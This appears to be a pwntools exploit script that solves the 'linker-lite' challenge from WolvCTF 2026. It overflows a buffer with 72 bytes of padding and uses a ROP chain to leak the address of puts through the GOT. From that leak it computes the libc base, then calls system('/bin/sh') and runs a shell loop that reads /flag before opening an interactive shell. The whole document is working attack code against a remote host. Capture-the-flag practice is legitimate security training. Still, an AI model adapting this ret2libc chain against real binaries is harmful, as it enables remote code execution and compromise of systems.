from pwn import * 
HOST="linker-lite.wolvctf-2026.kctf.cloud"
PORT=1337

# context.log_level = 'debug'
elf=ELF("./linker-lite")


rop = ROP(elf)
ret = rop.find_gadget(["ret"]).address

# 0x0000000000401223 : pop rdi ; pop rsi ; pop rdx ; ret
ret_addr=0x401223
r=remote(HOST,PORT)
payload = b"A"*72
payload += p64(ret_addr)
payload += p64(elf.got["puts"])
payload += p64(0x000000)
payload += p64(0x000000)
payload += p64(elf.plt["puts"])
payload += p64(elf.sym["main"])

payload = payload.ljust(255, b"A")
r.sendline(payload)

r.recvuntil(b"send plugin blob:\n")
leaked = r.recvline().rstrip(b"\n")

libc = ELF("./libc.so.6")
leak = u64(leaked.ljust(8, b"\x00"))
libc.address = leak - libc.sym["puts"]

r.recvuntil(b"send plugin blob:\n")
payload2 = b"A"*72
payload2 += p64(ret)
payload2 += p64(ret_addr)
payload2 += p64(next(libc.search(b"/bin/sh\x00")))
payload2 += p64(0x000000)
payload2 += p64(0x000000)
payload2 += p64(libc.sym["system"])

r.send(payload2.ljust(256, b"A"))
r.sendline(b'''
if [ -r /flag ]; then
    while IFS= read -r line || [ -n "$line" ]; do
        printf '%s\\n' "$line"
    done < /flag
fi
''')

print(repr(r.recvrepeat(3)))

r.interactive()